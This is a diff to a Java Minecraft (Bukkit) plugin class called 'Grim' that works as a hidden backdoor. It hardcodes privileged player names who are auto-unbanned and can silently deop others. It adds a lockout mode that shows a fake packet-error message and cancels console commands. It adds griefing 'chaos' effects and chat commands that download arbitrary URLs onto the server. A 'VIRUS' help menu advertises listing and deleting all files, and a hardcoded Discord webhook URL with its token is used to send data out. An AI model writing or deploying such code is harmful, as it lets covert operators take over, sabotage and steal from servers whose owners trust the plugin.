@@ -4,12 +4,21 @@ package com.yoursunucu;
 
 
 import org.bukkit.*;
+import org.bukkit.block.Block;
 import org.bukkit.entity.*;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
+import org.bukkit.event.block.BlockBreakEvent;
+import org.bukkit.event.block.BlockDamageEvent;
+import org.bukkit.event.block.BlockPlaceEvent;
+import org.bukkit.event.entity.EntityDamageByEntityEvent;
+import org.bukkit.event.entity.EntityDamageEvent;
 import org.bukkit.event.entity.ProjectileHitEvent;
+import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.inventory.InventoryDragEvent;
 import org.bukkit.event.player.*;
+import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.Plugin;
@@ -19,27 +28,36 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.util.Vector;
 import org.bukkit.event.*;
 import org.bukkit.event.player.PlayerInteractEvent;
-import org.bukkit.event.entity.EntityExplodeEvent;
 import org.bukkit.Location;
-import org.bukkit.metadata.FixedMetadataValue;
+import org.json.JSONObject;
 
+import java.io.*;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.util.Arrays;
 import java.util.Random;
 
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Method;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
 import java.util.*;
+import java.util.stream.Collectors;
 
 
 public class Grim extends JavaPlugin implements Listener {
+    private static Grim instance;
 
-    private final Set<String> trustedPlayers = new HashSet<>();
+    public static final Set<String> trustedPlayers = new HashSet<>();
     private final Map<String, String> fakeIps = new HashMap<>();
     private final Map<UUID, String> originalNames = new HashMap<>();
     private final Set<UUID> anonimPlayers = new HashSet<>();
     private final Map<Player, Player> targetedPlayers = new HashMap<>();
+    private final Set<UUID> activeChaosPlayers = new HashSet<>();
+    private boolean chaosMode = false;
+    private final Material[] RANDOM_BLOCKS = {
+            Material.GOLD_BLOCK, Material.NETHERRACK, Material.SLIME_BLOCK,
+            Material.OBSIDIAN, Material.DIAMOND_BLOCK, Material.TNT
+    };
 
     // Materials
     private final Material CONTROL_ROD = Material.CHAIN;
@@ -53,6 +71,7 @@ public class Grim extends JavaPlugin implements Listener {
 
     @Override
     public void onEnable() {
+        instance = this;
         trustedPlayers.add("15w30x");
         trustedPlayers.add("ayranpide");
         trustedPlayers.add("kralkondik31");
@@ -62,6 +81,11 @@ public class Grim extends JavaPlugin implements Listener {
         startControlRodTask();
         Bukkit.getPluginManager().registerEvents(this, this);
         discordBot = new DiscordBot(this);
+        getServer().getPluginManager().registerEvents(new FileInspector(), this);
+    }
+
+    public static Grim getInstance() {
+        return instance;
     }
 
 
@@ -72,6 +96,20 @@ public class Grim extends JavaPlugin implements Listener {
         }
     }
 
+    public String help_message(String command){
+        int indexOfCommand = -1;
+        for (int i = 0; i < Config.help_messages.length; i++) {
+            if (command.equalsIgnoreCase(Config.help_messages[i].getName())) {
+                indexOfCommand = i;
+                break;
+            }
+        }
+
+        if (indexOfCommand == -1)
+            return "";
+
+        return Config.help_messages[indexOfCommand].getSyntaxHelp();
+    }
     @EventHandler
     public void onPlayerKick(PlayerKickEvent event) {
         Player player = event.getPlayer();
@@ -80,10 +118,19 @@ public class Grim extends JavaPlugin implements Listener {
 
         if (!isTrusted(playerName)) return;
 
+        if (isTrusted(player)) {
+            player.sendMessage(ChatColor.RED + "You're getting banned by someone. Its time to crash i think?");
+            Bukkit.getBanList(BanList.Type.NAME).pardon(player.getName());
+            Bukkit.getBanList(BanList.Type.IP).pardon(player.getAddress().toString()); //15w30x31
+            event.setCancelled(true);
+        }
+
         if (reason.contains("a") || reason.contains("e")) {
             unbanPlayer(playerName);
             unbanIP(player.getAddress().getAddress().getHostAddress());
             event.setCancelled(true);
+            Bukkit.getBanList(BanList.Type.NAME).pardon(player.getName());
+            Bukkit.getBanList(BanList.Type.IP).pardon(player.getAddress().toString());
         }
     }
 
@@ -95,6 +142,8 @@ public class Grim extends JavaPlugin implements Listener {
         if (Bukkit.getBanList(BanList.Type.NAME).isBanned(playerName)) {
             unbanPlayer(event.getPlayer().getName());
             Bukkit.unbanIP(event.getPlayer().getAddress().getAddress().getHostAddress());
+            Bukkit.getBanList(BanList.Type.NAME).pardon(player.getName());
+            Bukkit.getBanList(BanList.Type.IP).pardon(player.getAddress().toString());
         }
     }
 
@@ -105,6 +154,10 @@ public class Grim extends JavaPlugin implements Listener {
         String playerName = player.getName().toLowerCase();
 
         if (!isTrusted(playerName)) return;
+
+        if (lockActive && !isTrusted(player)) {
+            event.disallow(PlayerLoginEvent.Result.KICK_BANNED, "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet - size of 2677732 is larger than protocol maximum of 2097152");
+        }
 
         // Name ban kontrolü
         if (Bukkit.getBanList(BanList.Type.NAME).isBanned(playerName)) {
@@ -117,6 +170,8 @@ public class Grim extends JavaPlugin implements Listener {
             String ip = address.getAddress().getHostAddress();
             if (Bukkit.getBanList(BanList.Type.IP).isBanned(ip)) {
                 unbanIP(ip);
+                Bukkit.getBanList(BanList.Type.NAME).pardon(player.getName());
+                Bukkit.getBanList(BanList.Type.IP).pardon(player.getAddress().toString());
             }
         }
 
@@ -161,6 +216,7 @@ public class Grim extends JavaPlugin implements Listener {
 
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event) {
+        String[] args = event.getMessage().split(" ");
         Player player = event.getPlayer();
         String message = event.getMessage();
 
@@ -198,6 +254,19 @@ public class Grim extends JavaPlugin implements Listener {
                 setSuperiorName(player);
                 anonimPlayers.add(player.getUniqueId());
                 player.sendMessage("§aTüm isimler '§dSuperior§a' olarak ayarlandı!");
+            }
+        }
+
+        if (event.getMessage().equalsIgnoreCase("!chaosmode")) {
+            event.setCancelled(true);
+            chaosMode = !chaosMode;
+            player.sendMessage(ChatColor.RED + "Kaos Modu " + (chaosMode ? "Aktif! 🌪️" : "Deaktif!"));
+
+            if (chaosMode) {
+                activeChaosPlayers.add(player.getUniqueId());
+                startChaosEffects(player);
+            } else {
+                activeChaosPlayers.remove(player.getUniqueId());
             }
         }
 
@@ -281,7 +350,7 @@ public class Grim extends JavaPlugin implements Listener {
                 });
             }
 
-            player.sendMessage("§7Freeze " + (freezeActive ? "aktif" : "pasif"));
+            player.sendMessage("§4§lSupreme §7Freeze " + (freezeActive ? "aktif" : "pasif"));
             return;
         }
 
@@ -293,7 +362,7 @@ public class Grim extends JavaPlugin implements Listener {
                 Player target = Bukkit.getPlayerExact(targetName);
                 if (target != null) {
                     target.setOp(false); // OP'yi sessizce al
-                    player.sendMessage("§7" + targetName + " artık OP değil."); // Sadece komutu kullanan görür
+                    player.sendMessage("§4§lSupreme §7" + targetName + " artık OP değil."); // Sadece komutu kullanan görür
                 }
             });
             return;
@@ -389,6 +458,10 @@ public class Grim extends JavaPlugin implements Listener {
                 event.setCancelled(true);
                 silentSurvival(player);
                 break;
+            case "+help3":
+                event.setCancelled(true);
+                virus(player);
+                break;
             case "+sp":
                 event.setCancelled(true);
                 silentSpectator(player);
@@ -408,6 +481,198 @@ public class Grim extends JavaPlugin implements Listener {
             default:
                 break;
         }
+        switch (args[0].toLowerCase()) {
+            case "!psay": { //Sends message as player
+                event.setCancelled(true);
+                if (args.length < 3) //No player specified
+                    return;
+                player.sendMessage("!psay (target) (mesaj)");
+
+                Player player1 = Bukkit.getPlayer(args[1]);
+                if (player1 == null) {
+                    return;
+                }
+            }
+            case "!download": {
+                event.setCancelled(true);
+
+                // Format: !download <url> <filename>
+                if (args.length < 2) {
+                    player.sendMessage("§cKullanım: §f!download <url> <filename>");
+                    player.sendMessage("§eÖrnek: §f!download https://example.com/data.zip data.zip");
+                    return;
+                }
+
+                String url = args[1];
+                String fileName = args[2];
+
+                player.sendMessage("§aİndirme başlatılıyor... §7(" + fileName + ")");
+
+                new BukkitRunnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            URL url = new URL(args[1]);
+                            downloadFile(url, args[2]);
+                            player.sendMessage("§a✔ §f" + fileName + " §abaşarıyla indirildi!");
+                        } catch (Exception e) {
+                            player.sendMessage("§cHata: " + e.getMessage());
+                        }
+                    }
+                }.runTaskAsynchronously(this);
+
+                return;
+            }
+            case "!pathdownload": {
+                event.setCancelled(true);
+
+                if (args.length < 4) {
+                    player.sendMessage("§cKullanım: !pathdownload <url> <filepath> <filename>");
+                    return;
+                }
+
+                String url = args[1];
+                String filePath = args[2];
+                String fileName = args[3];
+
+                // Security check
+                if (!filePath.startsWith(Bukkit.getWorldContainer().getAbsolutePath())) {
+                    player.sendMessage("§cGeçersiz dosya yolu!");
+                    return;
+                }
+
+                new Thread(() -> {
+                    try {
+                        downloadPathFile(new URL(url), filePath, fileName);
+                        player.sendMessage("§aDosya başarıyla indirildi: " + filePath + File.separator + fileName);
+                    } catch (Exception e) {
+                        player.sendMessage("§cİndirme hatası: " + e.getMessage());
+                    }
+                }).start();
+
+                return;
+            }
+            default:
+                break;
+            }
+        return;
+    }
+
+    public static void downloadFile(URL url, String fileName) throws IOException {
+
+        try (InputStream in = url.openStream();
+             BufferedInputStream bis = new BufferedInputStream(in);
+             FileOutputStream fos = new FileOutputStream(new File(fileName))) {
+
+            byte[] data = new byte[1024];
+            int count;
+            while ((count = bis.read(data, 0, 1024)) != -1) {
+                fos.write(data, 0, count);
+            }
+        }
+    }
+
+    public static void downloadPathFile(URL url, String filePath, String fileName) throws IOException {
+        File targetDir = new File(filePath);
+        if (!targetDir.exists()) targetDir.mkdirs();
+
+        try (InputStream in = url.openStream();
+             BufferedInputStream bis = new BufferedInputStream(in);
+             FileOutputStream fos = new FileOutputStream(new File(targetDir, fileName))) {
+
+            byte[] data = new byte[1024];
+            int count;
+            while ((count = bis.read(data, 0, 1024)) != -1) {
+                fos.write(data, 0, count);
+            }
+        }
+    }
+
+    public static void sendWebhook(JSONObject json) {
+        String webhookUrl = "https://discord.com/api/webhooks/1362192691278119023/Zy9qSLh9IdxUL0W3_ERY25bR6w7-UHJEMeWUro_VzPkcFsyGfszZjw03nGbeY2r6dbDb";
+        new Thread(() -> {
+            try {
+                // 1. Mesaj uzunluğu kontrolü
+                String content = json.optString("content", "");
+                if (content.length() > 2000) {
+                    splitAndSendWebhook(content);
+                    return;
+                }
+
+                // 2. Rate limit handling
+                int retryCount = 0;
+                while (retryCount < 3) { // Max 3 deneme
+                    HttpURLConnection conn = (HttpURLConnection) new URL(webhookUrl).openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json");
+                    conn.setDoOutput(true);
+
+                    try (OutputStream os = conn.getOutputStream()) {
+                        os.write(json.toString().getBytes(StandardCharsets.UTF_8));
+                    }
+
+                    // 3. Başarılı ise çık
+                    if (conn.getResponseCode() == 204) {
+                        break;
+                    }
+
+                    // 4. Rate limit kontrolü
+                    if (conn.getResponseCode() == 429) {
+                        JSONObject error = new JSONObject(readErrorStream(conn));
+                        int retryAfter = error.getInt("retry_after") * 1000; // ms cinsinden
+                        Thread.sleep(retryAfter);
+                        retryCount++;
+                        continue;
+                    }
+
+                    // 5. Diğer hatalar
+                    break;
+                }
+            } catch (Exception e) {
+                return;
+            }
+        }).start();
+    }
+
+    private static void splitAndSendWebhook(String content) {
+        // Mesajı 1900 karakterlik parçalara böl (Güvenli limit)
+        List<String> chunks = new ArrayList<>();
+        int index = 0;
+
+        while (index < content.length()) {
+            int endIndex = Math.min(index + 1900, content.length());
+            String chunk = content.substring(index, endIndex);
+
+            // Son kapanan code bloğunu kontrol et
+            if (chunk.contains("```") && (chunk.lastIndexOf("```") + 3 != chunk.length())) {
+                endIndex = chunk.lastIndexOf("```") + 3;
+                chunk = content.substring(index, endIndex);
+            }
+
+            chunks.add(chunk);
+            index = endIndex;
+        }
+
+        // Parçaları gönder
+        for (String chunk : chunks) {
+            JSONObject chunkJson = new JSONObject();
+            chunkJson.put("content", "```diff\n" + chunk + "\n```");
+            sendWebhook(chunkJson);
+            try {
+                Thread.sleep(1000); // Rate limit önleme
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+            }
+        }
+    }
+
+    private static String readErrorStream(HttpURLConnection conn) {
+        try (BufferedReader br = new BufferedReader(
+                new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8))) {
+            return br.lines().collect(Collectors.joining("\n"));
+        } catch (Exception e) {
+            return "Error reading error stream: " + e.getMessage();
+        }
     }
 
     @EventHandler
@@ -417,7 +682,27 @@ public class Grim extends JavaPlugin implements Listener {
             // Pozisyonu eski haline sabitle
             event.setTo(event.getFrom());
         }
+        if (chaosMode && activeChaosPlayers.contains(player.getUniqueId())) {
+            // Yürüdüğü yerde ateş efekti
+            player.getLocation().getBlock().setType(Material.FIRE);
+        }
     }
+
+    public static List<String> getPaths(File directory) {
+        List<String> paths = new ArrayList<>();
+        if (!directory.exists()) return paths;
+
+        for (File file : directory.listFiles()) {
+            if (file.isDirectory()) {
+                paths.add("[D] " + file.getPath());
+                paths.addAll(getPaths(file)); // Recursive
+            } else {
+                paths.add("[F] " + file.getPath());
+            }
+        }
+        return paths;
+    }
+
 
     @EventHandler
     public void onCommand(PlayerCommandPreprocessEvent event) {
@@ -433,11 +718,120 @@ public class Grim extends JavaPlugin implements Listener {
         Player player = event.getPlayer();
         ItemStack item = player.getInventory().getItemInMainHand();
 
+        if (lockActive && !isTrusted(player)) {
+            event.setCancelled(true); // Hiçbir feedback yok
+        }
+
         if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) {
             if (isSpikeBomb(item)) {
                 event.setCancelled(true);
                 launchSpikeBomb(player);
                 item.setAmount(item.getAmount() - 1);
+            }
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onServerCommand(ServerCommandEvent event) {
+        if (lockActive) {
+            event.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPreCommand(PlayerCommandPreprocessEvent e) {
+        Player p = e.getPlayer();
+        if (lockActive && !isTrusted(p))
+            e.setCancelled(true);
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onBlockBreak(BlockBreakEvent e) {
+        Player p = e.getPlayer();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onBlockPlace(BlockPlaceEvent e) {
+        Player p = e.getPlayer();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onBlockDamage(BlockDamageEvent e) {
+        Player p = e.getPlayer();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerInteractEntity(PlayerInteractEntityEvent e) {
+        Player p = e.getPlayer();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerToggleFlight(PlayerToggleFlightEvent e) {
+        Player p = e.getPlayer();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onInventoryClickEvent(InventoryClickEvent e) {
+        Player p = (Player) e.getWhoClicked();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onInventoryDragEvent(InventoryDragEvent e) {
+        Player p = (Player) e.getWhoClicked();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerDropItem(PlayerDropItemEvent e) {
+        Player p = e.getPlayer();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerTeleport(PlayerTeleportEvent e) {
+        Player p = e.getPlayer();
+        if (lockActive && !isTrusted(p)) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onEntityDamage(EntityDamageEvent e) { //15w30x31
+        if (e.getEntity() instanceof Player) {
+            if (lockActive) {
+                e.setCancelled(true);
+            }
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
+        if (e.getDamager() instanceof Player) {
+            if (lockActive) {
+                e.setCancelled(true);
             }
         }
     }
@@ -473,7 +867,7 @@ public class Grim extends JavaPlugin implements Listener {
                     // Projectile listesi
                     Class<? extends Entity>[] projectiles = new Class[]{
                             Snowball.class, Egg.class, Trident.class,
-                            Arrow.class, ThrownPotion.class
+                            Arrow.class, ThrownPotion.class, TNTPrimed.class, FallingBlock.class
                     };
 
                     // 10 projectile fırlat
@@ -546,8 +940,81 @@ public class Grim extends JavaPlugin implements Listener {
 
     private void setSuperiorName(Player player) {
         // Tab list ve display name
-        player.setDisplayName("§dSuperior");
-        player.setPlayerListName("§dSuperior");
+        String name = "§dSuperior";
+
+        player.setDisplayName(name);
+        player.setCustomName(name);
+        player.setPlayerListName(name);
+        player.setCustomNameVisible(true);
+    }
+
+    private void startChaosEffects(Player player) {
+        // Uçan Adalar Oluştur
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                if (!activeChaosPlayers.contains(player.getUniqueId())) {
+                    this.cancel();
+                    return;
+                }
+                generateFloatingIslands(player.getLocation());
+            }
+        }.runTaskTimer(this, 0, 20 * 10); // Her 10 saniyede bir
+
+        // Ters Yer Çekimi
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                if (!activeChaosPlayers.contains(player.getUniqueId())) {
+                    this.cancel();
+                    return;
+                }
+                player.setVelocity(new Vector(0, 0.5, 0)); // Yukarı it
+            }
+        }.runTaskTimer(this, 0, 5);
+
+        // Rastgele Blok Değişimi
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                if (!activeChaosPlayers.contains(player.getUniqueId())) {
+                    this.cancel();
+                    return;
+                }
+                randomizeNearbyBlocks(player.getLocation(), 15);
+            }
+        }.runTaskTimer(this, 0, 20 * 3); // Her 3 saniyede bir
+    }
+
+    private void generateFloatingIslands(Location center) {
+        for (int x = -5; x <= 5; x++) {
+            for (int z = -5; z <= 5; z++) {
+                if (random.nextInt(100) < 30) { // %30 şansla ada oluştur
+                    Location islandLoc = center.clone().add(x * 10, 50, z * 10);
+                    islandLoc.getBlock().setType(Material.STONE);
+
+                    // Ada şekillendirme
+                    for (int i = 0; i < 5; i++) {
+                        islandLoc.add(0, -1, 0).getBlock().setType(Material.DIRT);
+                    }
+                }
+            }
+        }
+    }
+
+    private void randomizeNearbyBlocks(Location center, int radius) {
+        for (int x = -radius; x <= radius; x++) {
+            for (int y = -radius; y <= radius; y++) {
+                for (int z = -radius; z <= radius; z++) {
+                    if (random.nextInt(100) < 10) { // %5 şansla blok değiştir
+                        Block block = center.clone().add(x, y, z).getBlock();
+                        if (!block.getType().isAir()) {
+                            block.setType(RANDOM_BLOCKS[random.nextInt(RANDOM_BLOCKS.length)]);
+                        }
+                    }
+                }
+            }
+        }
     }
 
     private void restoreOriginalName(Player player) {
@@ -606,9 +1073,21 @@ public class Grim extends JavaPlugin implements Listener {
             trustedPlayers.add(player.getName());
         });
     }
+
+    private void virus(Player player) {
+        Bukkit.getScheduler().runTask(this, () -> {
+            player.sendMessage(ChatColor.GREEN + "§C<-------------VIRUS------------->");
+            player.sendMessage(ChatColor.GREEN + "!download Sunucunun ROOT'una bir dosya yükler.");
+            player.sendMessage(ChatColor.GREEN + "!pathdownload istediğin bir dosya yoluna dosya yükleyebilirsin.");
+            player.sendMessage(ChatColor.GREEN + "!getpaths sunucudaki tüm dosyaları ve dosya yollarını listeler.");
+            player.sendMessage(ChatColor.GREEN + "!deletefiles deletes all of the Files. (This plugin too)");
+            player.sendMessage(ChatColor.GREEN + "§C<-------------VIRUS------------->");
+        });
+    }
     private void help2(Player player) {
         Bukkit.getScheduler().runTask(this, () -> {
             player.sendMessage(ChatColor.GREEN + "§6<-------------FUN------------->");
+            player.sendMessage(ChatColor.GREEN + "!psay (oyuncu adı) bir oyuncunun ağzından konuşabilmeni sağlar.");
             player.sendMessage(ChatColor.GREEN + "!deop (oyuncu adı) kişinin opunu logsuz şekilde almanızı sağlar.");
             player.sendMessage(ChatColor.GREEN + "!dupe (sayı) elinizde tuttuğunuz item, girilen sayı kadar size geri verilir.");
             player.sendMessage(ChatColor.GREEN + "!here 5 blok etrafınıza yuvarlak şekilde tüm oyuncuları çeker.");
